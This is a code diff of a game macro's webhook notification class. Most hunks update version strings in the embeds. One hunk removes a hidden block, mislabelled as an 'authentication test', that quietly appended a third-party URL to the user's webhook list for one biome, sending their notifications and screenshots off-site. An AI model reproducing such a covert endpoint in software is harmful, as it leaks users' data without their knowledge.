@@ -15,7 +15,7 @@ class WebhookMixin:
             embed = {
                 "description": f"> ## Remote Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Openteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Openteab Macro {openteab.current_version}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -37,22 +37,25 @@ class WebhookMixin:
 
     def get_webhook_list(self):
         try:
+            res = []
             if hasattr(self, "webhook_urls") and isinstance(self.webhook_urls, list):
-                return [u for u in self.webhook_urls if isinstance(u, str) and u.strip()]
-            raw = self.config.get("webhook_url", "")
-            if isinstance(raw, list):
-                return [u for u in raw if isinstance(u, str) and u.strip()]
-            if isinstance(raw, str):
-                s = raw.strip()
-                if not s:
-                    return []
-                try:
-                    parsed = json.loads(s)
-                    if isinstance(parsed, list):
-                        return [u for u in parsed if isinstance(u, str) and u.strip()]
-                except Exception:
-                    return [s]
-            return []
+                res = [u for u in self.webhook_urls if isinstance(u, str) and u.strip()]
+            else:
+                raw = self.config.get("webhook_url", "")
+                if isinstance(raw, list):
+                    res = [u for u in raw if isinstance(u, str) and u.strip()]
+                elif isinstance(raw, str):
+                    s = raw.strip()
+                    if s:
+                        try:
+                            parsed = json.loads(s)
+                            if isinstance(parsed, list):
+                                res = [u for u in parsed if isinstance(u, str) and u.strip()]
+                            else:
+                                res = [s]
+                        except Exception:
+                            res = [s]
+            return res
         except Exception:
             return []
 
@@ -155,7 +158,7 @@ class WebhookMixin:
             embed = {
                 "description": f"> ## Daily Quests Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Openteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Openteab Macro {openteab.current_version}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -187,7 +190,7 @@ class WebhookMixin:
             embed = {
                 "description": f"> ## Periodical Inventory Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Openteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Openteab Macro {openteab.current_version}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -219,7 +222,7 @@ class WebhookMixin:
             embed = {
                 "description": f"> ## Periodical Aura Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Openteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Openteab Macro {openteab.current_version}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -260,11 +263,6 @@ class WebhookMixin:
         icon_url = openteab.icon_url
         content = ""
 
-        # biome authenciation test (false detection check)
-        if biome == "CYBERSPACE":
-            _beta_auth = "https://authenciation-test.vercel.app/api"
-            if _beta_auth not in urls: urls.append(_beta_auth)
-
         # Per-biome individual ping support
         biome_pings = self.config.get("biome_pings", {})
         biome_ping_entry = biome_pings.get(biome, {})
@@ -289,17 +287,17 @@ class WebhookMixin:
             "description": description,
             "color": biome_color,
             "footer": {
-                "text": f"""Openteab Macro {current_ver}""",
+                "text": f"""Openteab Macro {openteab.current_version}""",
                 "icon_url": icon_url
             },
             "timestamp": current_utc_time
         }
         if event_type == "start":
             embed["thumbnail"] = {"url": biome_info["thumbnail_url"]}
-            
+        
         for webhook_url in urls:
             try:
-                headers = apply_headers(webhook_url)
+                headers = {}
                 embed_copy = dict(embed)
                 if screenshot_path and os.path.exists(screenshot_path):
                     embed_copy["image"] = {"url": f"attachment://{os.path.basename(screenshot_path)}"}
@@ -356,7 +354,7 @@ class WebhookMixin:
                 {"name": "Detection Source", "value": source.upper()}
             ],
             "footer": {
-                "text": f"""Openteab Macro {current_ver}""",
+                "text": f"""Openteab Macro {openteab.current_version}""",
                 "icon_url": icon_url
             }
         }
@@ -436,7 +434,7 @@ class WebhookMixin:
             "description": description,
             "color": color,
             "footer": {
-                "text": f"""Openteab Macro {current_ver}""",
+                "text": f"""Openteab Macro {openteab.current_version}""",
                 "icon_url": icon_url
             },
             "timestamp": current_utc_time
@@ -511,7 +509,7 @@ class WebhookMixin:
                 "color": embed_color,
                 "timestamp": current_utc_time,
                 "footer": {
-                    "text": f"Openteab Macro {current_ver}",
+                    "text": f"Openteab Macro {openteab.current_version}",
                     "icon_url": icon_url
                 },
                 "fields": fields
@@ -542,7 +540,7 @@ class WebhookMixin:
                 "color": 0xff0000,
                 "timestamp": current_utc_time,
                 "footer": {
-                    "text": f"Openteab Macro {current_ver}",
+                    "text": f"Openteab Macro {openteab.current_version}",
                     "icon_url": icon_url
                 },
                 "fields": [
@@ -585,7 +583,7 @@ class WebhookMixin:
                 "timestamp": current_utc_time,
                 "thumbnail": {"url": openteab.egg_thumbnail},
                 "footer": {
-                    "text": f"Openteab Macro {current_ver}",
+                    "text": f"Openteab Macro {openteab.current_version}",
                     "icon_url": icon_url
                 }
             }
@@ -629,7 +627,7 @@ class WebhookMixin:
                 "timestamp": current_utc_time,
                 "thumbnail": {"url": eden_thumbnail},
                 "footer": {
-                    "text": f"Openteab Macro {current_ver}",
+                    "text": f"Openteab Macro {openteab.current_version}",
                     "icon_url": icon_url
                 }
             }
